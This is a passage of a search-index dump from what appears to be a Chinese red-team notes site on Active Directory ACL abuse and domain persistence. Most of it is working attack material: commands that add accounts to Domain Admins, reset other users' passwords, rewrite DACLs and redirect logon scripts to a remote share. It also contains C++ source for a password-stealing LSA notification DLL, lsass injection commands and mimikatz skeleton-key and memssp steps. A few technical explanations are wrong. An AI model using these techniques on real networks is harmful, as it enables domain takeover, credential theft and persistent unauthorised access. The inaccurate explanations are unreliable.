Services,CN=Services,CN=Configuration,DC=pentest,DC=com' $Acl.Access.Count $Acl.Access | where IdentityReference -match 'Domain Users'. //\u5b9a\u4e49\u67e5\u8be2\u8c01\u62e5\u6709\u6b64\u6743\u9650\uff1f","title":"\u67e5\u770bacl"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/#guid","text":"powershell \u9700\u8981\u4e0b\u8f7drsat\u5305 $ObjectTypeGUID = @{} $GetADObjectParameter=@{ SearchBase=(Get-ADRootDSE).SchemaNamingContext LDAPFilter='(SchemaIDGUID=*)' Properties=@(\"Name\", \"SchemaIDGUID\") } $SchGUID=Get-ADObject @GetADObjectParameter Foreach ($SchemaItem in $SchGUID){ $ObjectTypeGUID.Add([GUID]$SchemaItem.SchemaIDGUID,$SchemaItem.Name) } $ADObjExtPar=@{ SearchBase=\"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" LDAPFilter='(ObjectClass=ControlAccessRight)' Properties=@(\"Name\", \"RightsGUID\") } $SchExtGUID=Get-ADObject @ADObjExtPar ForEach($SchExtItem in $SchExtGUID){ $ObjectTypeGUID.Add([GUID]$SchExtItem.RightsGUID,$SchExtItem.Name) } $ObjectTypeGUID | Format-Table -AutoSize $ObjectTypeGUID[[GUID]'bf967961-0de6-11d0-a285-00aa003049e2'] \u4f5c\u7528\u60c5\u51b5\uff1a \u8868\u793aCIA\\Exchange Trusted Subsystem\u5bf9bob\u7528\u6237\u7684GUID\u4e3abf967a06-0de6-11d0-a285-00aa003049e2\uff08objecttype\uff09\u7684\u5c5e\u6027\u6709WriteProperty\u6743\u9650\u3002\u4f46\u662f\u8fd9\u4e2aguid\u6307\u5411\u7684\u662f\u54ea\u4e00\u4e2a\u5c5e\u6027\u5462\uff1f\u5c31\u53ef\u4ee5\u7528\u8fd9\u4e2a\u811a\u672c\u8f6c\u5316\u51fa\u6765\u3002 powerview\u7684SecurityIdentifier\u4e5f\u53ef\u4ee5\u89e3\u51fa\u6765\u770b\u8c01\u6709\u8fd9\u4e2a\u6743\u9650\u3002","title":"GUID\u8f6c\u6362\u811a\u672c"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/#_2","text":"\u4e0d\u5b89\u5168\u7684\u914d\u7f6e\u5bfc\u81f4\u6743\u9650\u63d0\u5347 ForceChangePassword\uff1a\u5f3a\u5236\u6539\u53d8\u5f53\u4e0b\u7684\u5bc6\u7801 AddMembers\uff1a\u53ef\u4ee5\u5bf9\u76ee\u6807\u7ec4\u6dfb\u52a0\u7528\u6237\uff08\u5305\u62ec\u81ea\u5df1\u7684\u8d26\u6237\uff09 GenericAll\uff1a\u5b8c\u5168\u63a7\u5236\u5bf9\u8c61\uff0c\u5305\u62ec\u66f4\u6539\u5bc6\u7801\u3001\u6ce8\u518cSPN\u3001\u6dfb\u52a0AD\u5bf9\u8c61\u5230\u76ee\u6807\u7ec4\u91cc\u9762 GenericWrite:\u66f4\u6539\u76ee\u6807\u5199\u5165\u53c2\u6570\uff0c\u5bfc\u81f4\u4e0b\u6b21\u7528\u6237\u767b\u5f55\u811a\u672c\u5c31\u8981\u6267\u884c WriteOwne\uff1a\u66f4\u65b0\u76ee\u6807\u5bf9\u8c61\u7684\u6240\u6709\u8005\uff0c\u53ef\u4ee5\u8ba9\u81ea\u5df1\u6210\u4e3a\u6240\u6709\u8005 WriteDACL\uff1a\u66f4\u65b0\u5bf9\u9762\u7684DACL\uff0c\u5c06ACL\u5199\u5165\u5bf9\u9762\u5b9e\u4f53\uff0c\u76f4\u63a5\u6388\u4e88\u6211\u4eec\u7684\u8d26\u6237\u5bf9\u5bf9\u8c61\u7684\u5b8c\u5168\u63a7\u5236\u6743 AllExtendedRights\uff1a\u80fd\u591f\u5bf9\u76ee\u6807\u5bf9\u8c61\u6267\u884c\u4e0e\u6269\u5c55 AD \u6743\u9650\u76f8\u5173\u7684\u4efb\u4f55\u64cd\u4f5c\u3002\u4f8b\u5982\uff0c\u8fd9\u5305\u62ec\u5f3a\u5236\u66f4\u6539\u7528\u6237\u5bc6\u7801\u7684\u80fd\u529b\u3002","title":"\u5229\u7528"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/#genericall","text":"\u5b8c\u5168\u63a7\u5236\u6743\u9650","title":"GenericAll"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/#genericall-on-user","text":"Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} \u770b\u5230bob\u5bf9delegate\u7528\u6237\u6709genericall\u6743\u9650 \u76f4\u63a5\u4fee\u6539\u5bc6\u7801\u5373\u53ef net user delegate password /domain","title":"genericall on user"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/#genericall-on-group","text":"\u67e5\u770b\u67d0\u4e2a\u7ec4\u7684ldap\u5b57\u7b26\u4e32 Get-NetGroup \"domain admins\" -FullData \u67e5\u770b\u8be5\u7528\u6237\u7ec4\u7684dacl Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq \"CN=Domain Admins,CN=Users,DC=offense,DC=local\"} \u5982\u679c\u5bf9\u4e00\u4e2a\u7ec4\u6709genericall\u6743\u9650\uff0c\u5c31\u53ef\u4ee5\u628a\u81ea\u5df1\u52a0\u8fdb\u53bb\uff0c\u5bf9\u4e8e\u7ba1\u7406\u5458\u7ec4\u6765\u8bf4\uff0c\u52a0\u8fdb\u53bb\u5c31\u6210\u4e86\u7ba1\u7406\u5458\u3002 net group \"domain admins\" spotless /add /domain \u4e5f\u6709\u4e00\u4e9b\u5176\u5b83\u7684\u6dfb\u52a0\u7528\u6237\u547d\u4ee4\uff0c\u4f46\u90fd\u9700\u8981\u4e00\u4e9b\u811a\u672c\u4f9d\u8d56 # with active directory module Add-ADGroupMember -Identity \"domain admins\" -Members spotless # with Powersploit Add-NetGroupUser -UserName spotless -GroupName \"domain admins\" -Domain \"offense.local\"","title":"genericall on group"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/#writeproperty","text":"\u53ef\u4ee5\u5199\u5176\u5b83\u7528\u6237\u7684\u5c5e\u6027\u3002 \u5982\u679c\u53ef\u4ee5\u5bf9\u67d0\u4e2a\u7ec4\u5199\u5168\u90e8\u5c5e\u6027 \u90a3\u4e48\u5c31\u53ef\u4ee5\u628a\u8be5\u7528\u6237\u76f4\u63a5\u52a0\u5165\u6b64\u7528\u6237\u7ec4 Add-NetGroupUser -UserName spotless -GroupName \"domain admins\" -Domain \"offense.local\" or net group \"domain admins\" spotless /add /domain","title":"writeproperty"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/#self-membership","text":"\"Self-Membership\u662f\u4e00\u79cd\u6743\u9650\uff0c\u5b83\u5141\u8bb8\u7528\u6237\u81ea\u5df1\u7ba1\u7406\u81ea\u5df1\u7684\u6210\u5458\u8eab\u4efd\u3002\u5177\u4f53\u6765\u8bf4\uff0cSelf-Membership\u6743\u9650\u5141\u8bb8\u7528\u6237\u6dfb\u52a0\u6216\u5220\u9664\u81ea\u5df1\u4f5c\u4e3a\u67d0\u4e2a\u7ec4\u7ec7\u3001\u56e2\u961f\u6216\u9879\u76ee\u7684\u6210\u5458\u3002\u8fd9\u610f\u5473\u7740\u7528\u6237\u53ef\u4ee5\u81ea\u4e3b\u51b3\u5b9a\u52a0\u5165\u6216\u79bb\u5f00\u7279\u5b9a\u7684\u7ec4\u7ec7\u3001\u56e2\u961f\u6216\u9879\u76ee\uff0c\u800c\u65e0\u9700\u7ba1\u7406\u5458\u6216\u5176\u4ed6\u6210\u5458\u7684\u5e72\u9884\u3002Self-Membership\u6743\u9650\u901a\u5e38\u7528\u4e8e\u63d0\u4f9b\u66f4\u5927\u7684\u81ea\u7531\u5ea6\u548c\u7075\u6d3b\u6027\uff0c\u4f7f\u7528\u6237\u80fd\u591f\u81ea\u4e3b\u7ba1\u7406\u81ea\u5df1\u7684\u6210\u5458\u8eab\u4efd\u3002\"","title":"Self-Membership"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/#self-membership_1","text":"\u5982\u679c\u5bf9\u67d0\u4e2a\u7ec4\u6709\u8fd9\u4e2a\u6743\u9650\uff0c\u4e14activedirectoryRights\u4e3aself\u6216\u8005\u6709writeproperty\uff0c\u4e5f\u53ef\u4ee5\u628a\u81ea\u5df1\u62c9\u8fdb\u8be5\u7528\u6237\u7ec4 Add-NetGroupUser -UserName spotless -GroupName \"domain admins\" -Domain \"offense.local\" or net group \"domain admins\" spotless /add /domain","title":"Self-Membership"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/#forcechangepassword","text":"\u5982\u679c\u6211\u4eec\u5bf9\u67d0\u7528\u6237\u6709\u8be5\u6743\u9650\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u6539\u4ed6\u7684\u5bc6\u7801 powersploit Set-DomainUserPassword -Identity delegate -Verbosed \u6216\u8005 $c = Get-Credential Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose \u4e0a\u9762\u6307\u4ee4\u4e0d\u80fd\u4e00\u6b65\u5230\u4f4d\uff0c\u56e0\u4e3a\u4e2d\u95f4\u4f1a\u6709\u95ee\u8be2\u63d0\u793a\u8f93\u5165\u5bc6\u7801\u3002\u7528\u4e0b\u9762\u8fd9\u4e2a\u65b9\u6cd5\u5c31\u53ef\u4ee5\u76f4\u63a5\u6539\u4e86 Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose","title":"ForceChangePassword"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/#writeowner","text":"\u5982\u679c\u5f53\u524d\u7528\u6237\u5bf9\u67d0\u4e2a\u7ec4\u6709\u8be5\u6743\u9650\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u8be5\u7ec4\u7684object's owner\u6539\u4e3a\u81ea\u5df1\uff0c\u4ece\u800c\u63a7\u5236\u8be5\u7ec4\uff0c\u6bd4\u5982\u53ef\u4ee5\u628a\u5176\u5b83\u7528\u6237\u6dfb\u52a0\u8fdb\u8be5\u7ec4\u3002 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq \"CN=Domain Admins,CN=Users,DC=offense,DC=local\" -and $_.IdentityReference -eq \"OFFENSE\\spotless\"} powersploit Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity \"spotless\" -Verbose sid\u83b7\u53d6 wmic group where name=\"Domain Admins\" get name,sid,domain","title":"writeowner"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/#genericwrite","text":"\"GenericWrite\" \u6743\u9650\u662f\u6307\u5bf9\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u8fdb\u884c\u5199\u5165\u64cd\u4f5c\u7684\u6743\u9650\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5b83\u5141\u8bb8\u7528\u6237\u5bf9\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u8fdb\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a \u521b\u5efa\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u3002 \u4fee\u6539\u6587\u4ef6\u5185\u5bb9\u6216\u6587\u4ef6\u5939\u5c5e\u6027\u3002 \u5220\u9664\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u3002 \u91cd\u547d\u540d\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u3002 \u5982\u679c\u5bf9\u67d0\u7528\u6237\u6709genericwrite\u6743\u9650\uff0c\u4e14objecttype\u4e3ascript-path\u3002\u90a3\u4e48\u5c31\u53ef\u4ee5\u4fee\u6539\u8be5\u7528\u6237\u7684login script\uff0c\u5f53\u8be5\u7528\u6237\u4e0b\u6b21\u767b\u5f55\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5199\u5165\u5176login script\u7684\u6076\u610f\u811a\u672c\u5c31\u4f1a\u88ab\u89e6\u53d1 Module:ActiveDirectory Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue \"\\\\10.0.0.5\\totallyLegitScript.ps1\"","title":"GenericWrite"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/#writedacl","text":"\u5982\u679ca\u5bf9b\u6709writedacl\u6743\u9650\uff0c\u90a3\u4e48\u53ef\u4ee5a\u53ef\u4ee5\u5411b\u7684acl\u5199\u5165genericall\u6743\u9650\u6765\u5b9e\u73b0\u5b8c\u5168\u63a7\u5236\uff0c\u4ece\u800c\u63a5\u7ba1b\u7528\u6237\u3002 \u5982\u679ca\u5bf9\u67d0\u7528\u6237\u7ec4\u6709writeacl\u6743\u9650\uff0c\u4e5f\u53ef\u4ee5\u4f7fa\u5bf9\u8be5\u7ec4\u6709genericall\u6743\u9650\u5e76\u628aa\u7528\u6237\u52a0\u5165\u5230\u8be5\u7ec4 \u53ef\u7528dsacls\u6216powersploit \u8ba9Brandi.Khan\u83b7\u5f97\u5bf9Carol.Dean\u7684genericall\u6743\u9650 dsacls \"\\\\10.0.1.100\\CN=Carol.Dean,CN=Users,DC=pwn,DC=local\" /I:T /G \"pwn\\Brandi.Khan:GA\" \u4f7ftest1\u83b7\u5f97\u5bf9bob\u7684genericall\u6743\u9650 Add-DomainObjectAcl -TargetIdentity 'bob' -PrincipalIdentity test1 -Rights All Add-DomainObjectAcl -TargetIdentity \"IT Desk\" -PrincipalIdentity snovvcrash -Domain tricky.com -Rights All -Verbose Add-DomainGroupMember -Identity \"IT Desk\" -Members snovvcrash -Verbose $ADSI = [ADSI]\"LDAP://CN=test,CN=Users,DC=offense,DC=local\" //\u53ef\u88ab\u4fee\u6539acl\u7684\u5bf9\u8c61\u7684ldap\u8def\u5f84 $IdentityReference = (New-Object System.Security.Principal.NTAccount(\"Username\")).Translate([System.Security.Principal.SecurityIdentifier])//\u5b9a\u4e49\u8c01\u4f1a\u83b7\u5f97\u8fd9\u4e2a\u7ec4\u7684\u6743\u9650 $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,\"GenericAll\",\"Allow\" //\u5b9a\u4e49\u6388\u4e88\u6743\u9650\u4e3agenericall $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE) $ADSI.psbase.commitchanges()","title":"writeDACL"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/","text":"\u57df\u6743\u9650\u7ef4\u6301\u901a\u7528\u65b9\u6cd5\u603b\u6c47 \u76ee\u5f55 Hook PasswordChangeNotify \u4e07\u80fd\u5bc6\u7801 SSP\u6ce8\u5165 SID History\u540e\u95e8 DSRM\u540e\u95e8 \u59d4\u6d3e\u540e\u95e8 \u9ec4\u91d1\u7968\u636e\u751f\u6210 AdminSDHolder Ntds.dit \u5229\u7528VSS\u5bfc\u51fa VSSADMIN Ntdsutil.exe \u89e3\u6790NTDS.DIT Impacket \u8fdc\u7a0b\u89e3\u6790 DCSYNC DCSYNC\u7684powershell\u5b9e\u73b0 \u914d\u5408EXCHANGE\u7528\u6237\u8fbe\u5230\u57df\u63d0\u6743\u76ee\u7684 \u5229\u7528\u8bc1\u4e66\u6a21\u7248 Hook PasswordChangeNotify \u539f\u7406\uff1a\u5f53\u7528\u6237\u4fee\u6539\u5bc6\u7801\u65f6\u4f1a\u8f93\u5165\u660e\u6587\u5bc6\u7801\uff0cLSA\u4f1a\u8c03\u7528PasswordChangeNotify \u5728\u7cfb\u7edf\u4e2d\u540c\u6b65\u5bc6\u7801\u3002\u6211\u4eecHOOK\u8fd9\u4e2a\u51fd\u6570\uff0c\u6539\u53d8\u5176\u884c\u4e3a\uff0c\u5c31\u80fd\u8fbe\u5230\u83b7\u53d6\u7528\u6237\u4fee\u6539\u540e\u7684\u5bc6\u7801\u7684\u660e\u6587. Tool: Powersploit\u4e0b\u7684Invoke-ReflectivePEInjection.ps1 \uff08\u7528\u4e8e\u6ce8\u5165\uff09 https://github.com/PowerShellMafia/PowerSploit \u4ee5\u53ca https://github.com/clymb3r/Misc-Windows-Hacking \u7684HookPasswordChange.dll(\u9700\u81ea\u884c\u7f16\u8bd1) Import-Module .\\Invoke-ReflectivePEInjection.ps1 Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass \u6267\u884c\u5982\u4e0a\u547d\u4ee4\uff0c\u53ea\u8981\u4fee\u6539\u4e86\u7528\u6237\u7684\u5bc6\u7801\uff0c\u4fee\u6539\u540e\u7684\u660e\u6587\u5bc6\u7801\u5c31\u4f1a\u8bb0\u5f55\u5728 C:\\Windows\\Temp\\passwords.txt \u6587\u4ef6\u4e2d\u3002 \u4e0b\u9762\u6211\u4eec\u5206\u6790\u4e00\u4e0b\u539f\u7406 \u5f53\u5bc6\u7801\u6539\u53d8\u8bf7\u6c42\u53d1\u751f\u65f6\uff0cLSA\u4f1a\u8c03\u7528Password Filters\u3002\u6bcf\u4e00\u4e2apassword filter\u4f1a\u5148\u9a8c\u8bc1\u65b0\u5bc6\u7801\u7684\u5408\u6cd5\u6027\u548c\u590d\u6742\u5ea6\uff0c\u7136\u540eLSA\u4f1a\u53d1\u51fa\u8bf7\u6c42\u5df2\u66f4\u6539\u7684\u4fe1\u53f7\u3002 \u8be5\u8fc7\u7a0b\u7531 password notification DLL \u5b8c\u6210\u3002\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u52ab\u6301\u8fd9\u4e2aDLL\uff0c\u628a\u5b83\u6362\u6210\u6211\u4eec\u81ea\u5b9a\u4e49\u7684DLL\u5373\u53ef\u8fbe\u5230\u76ee\u7684\u3002 \u8fd9\u79cd\u65b9\u5f0f\u4e00\u822c\u5728Server\u670d\u52a1\u5668\u4e0a\u5229\u7528\u7387\u8f83\u9ad8 \u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u4e2adll\u6587\u4ef6\u7684\u5728\u6ce8\u518c\u8868\u4e2d\u7684\u8def\u5f84\u662f hklm\\system\\currentcontrolset\\control\\lsa\u7684 notification packages\u8868\u9879\u3002 \u6211\u4eec\u8981\u5229\u7528\u8be5\u65b9\u6cd5\uff0c\u9996\u5148\u8981\u786e\u4fdd\u5bc6\u7801\u7b56\u7565\u5df2\u542f\u7528 \u81f3\u4e8e\u547d\u4ee4\u884c\u600e\u4e48\u4fee\u6539\u3002\u53ef\u4ee5\u8fd9\u6837 secedit /export /cfg gp.inf /quiet \u5c06\u7ec4\u7b56\u7565\u5bfc\u51fa\u4e3a\u6587\u4ef6 \u5728\u8be5\u6587\u4ef6\u91cc\u5c06PasswordComplexity\u9879\u503c\u4fee\u6539\u4e3a1 \u7136\u540e\u7528secedit /configure /db gp.sdb /cfg gp.inf /quiet \u5c06\u5176\u5bfc\u5165\u6570\u636e\u5e93 \u5237\u65b0\u7ec4\u7b56\u7565\uff1a gpupdate/force \u91cd\u542f\u540e\u751f\u6548 \u4e0b\u9762\u6211\u4eec\u6784\u9020dll\u6587\u4ef6\u53bb\u8986\u76d6\u5b83\u3002 \u9996\u5148\u6211\u4eec\u7684dll\u6587\u4ef6\u5185\u5bb9\u5982\u4e0b\u3002 #include<Windows.h> #include<NTSecAPI.h> #include <fstream> extern \"C\" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify() { OutputDebugString(L\"InitializeChangeNotify\"); return TRUE; } extern \"C\" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter( PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation) { OutputDebugString(L\"PasswordFilter\"); return TRUE; } extern \"C\" __declspec(dllexport) BOOLEAN __stdcall PasswordChangeNotify( PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword) { FILE *pFile; fopen_s(&pFile, \"C:\\\\logFile.txt\", \"a+\"); fprintf(pFile, \"%ws:%ws\", UserName->Buffer, NewPassword->Buffer); return 0; } \u7136\u540e\u628a\u8fd9\u4e2adll\u6587\u4ef6\u653e\u5165system32\u6587\u4ef6\uff0c\u7136\u540e\u4fee\u6539\u6ce8\u518c\u8868\uff0c\u4f7f hklm\\system\\currentcontrolset\\control\\lsa\u7684 notification packages\u8868\u9879\u5305\u62ec\u6211\u4eec\u7684\u6076\u610fdll\u6587\u4ef6\uff0c\u5177\u4f53\u547d\u4ee4\u884c\u64cd\u4f5c\u5982\u4e0b REG ADD \"HKLMSYSTEMCurrentControlSetControlLsa\" /v \"Notification Packages\" /t REG_MULTI_SZ /d \"evildll\" /f \u91cd\u542f\u540e\u751f\u6548\u3002\u65e0\u5948\u7684\u662f\u6211\u628adll\u6587\u4ef6\u5199\u51fa\u6765\u4e86\u4e14\u786e\u4fdd\u662f\u6b63\u786e\u7684\uff0c\u5728win7\u548cwin2012\u4e0a\u590d\u73b0\u5747\u5931\u8d25\uff0c\u7f51\u4e0a\u6210\u529f\u7684\u4f8b\u5b50\u662fwin2008server\uff0c\u53ef\u60dc\u6211\u5e76\u6ca1\u6709\u8fd9\u4e2a\u7248\u672c\u7684\u865a\u62df\u673a\u4e0d\u8fc7\u539f\u7406\u5012\u662f\u61c2\u4e86 \u4e07\u80fd\u5bc6\u7801 \u8fd0\u7528mimkatz\u53ef\u4ee5\u5728\u57df\u63a7\u673a\u4e0a\u5bf9\u6240\u6709\u7528\u6237\u6dfb\u52a0\u4e00\u4e2a\u7edf\u4e00\u5bc6\u7801\u7528\u6765\u767b\u5f55. mimikatz# privilege::debug mimikatz# misc::skeleton \u7136\u540e\u6240\u6709\u7528\u6237\u90fd\u80fd\u7528\u5bc6\u7801 mimiaktz\u767b\u9646\u4e86 SSP\u6ce8\u5165 ssp:\u4e00\u4e2aDLL\u6587\u4ef6\uff0c\u7528\u6765\u5b9e\u73b0Windows\u8eab\u4efd\u9a8c\u8bc1\u529f\u80fd\uff0c\u6bd4\u5982kerberos\uff0cntlm\u3002\u7cfb\u7edf\u542f\u52a8\u65f6SSP\u4f1a\u88ab\u81ea\u52a8\u52a0\u8f7d\u5165lsass.exe sspi:SSP\u7684API\u63a5\u53e3 \u5982\u679c\u6211\u4eec\u81ea\u5b9a\u4e49\u4e2a\u6076\u610fdll\u6587\u4ef6\u8ba9\u4ed6\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u81ea\u52a8\u52a0\u8f7d\u5230lsass.exe,\u5c31\u80fd\u5f97\u5230\u8fdb\u7a0b\u4e2d\u7684\u660e\u6587\u5bc6\u7801 \u4e34\u65f6\u6027\u6ce8\u5165(\u91cd\u542f\u4fbf\u5931\u6548) mimikatz# privilege::debug mimiaktz# misc::memssp \u6267\u884c\u5982\u4e0a\u547d\u4ee4, \u7136\u540e\u53ea\u8981\u76ee\u6807\u673a\u5668\u4e0d\u91cd\u542f\uff0c\u5728\u76ee\u6807\u673a\u5668\u4e0a\u767b\u5f55\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u5c06\u4f1a\u88ab\u8bb0\u5f55\u5728 C:\\Windows\\System32\\mimilsa.log \u6587\u4ef6\u4e2d\u3002 \u957f\u671f\u6027\u6ce8\u5165\uff08\u91cd\u542f\u4e0d\u5931\u6548\uff09 \u628a mimikatz\u4e2d\u7684mimilib.dll\u653e\u5230\u7cfb\u7edf\u7684C:\\Windows\\System32\\ \u76ee\u5f55\u4e0b\uff0c\u5e76\u5c06 mimilib.dll \u6dfb\u52a0\u5230\u6ce8\u518c\u8868\u4e2d\uff0c\u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0c\u5373\u4f7f\u7cfb\u7edf\u91cd\u542f\uff0c\u4e5f\u4e0d\u4f1a\u5f71\u54cd\u6301\u4e45\u5316\u6548\u679c\u3002 \u4fee\u6539\u6ce8\u518c\u8868 HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa \u7684 Security Packages \u9879\uff0c\u52a0\u8f7d\u65b0\u7684DLL\u6587\u4ef6 \u7528\u6237\u5728\u767b\u5f55\u65f6\u8f93\u5165\u7684\u8d26\u53f7\u5bc6\u7801\u5c06\u4f1a\u88ab\u8bb0\u5f55\u5728 C:\\Windows\\System32\\kiwissp.log SID History\u540e\u95e8 sid 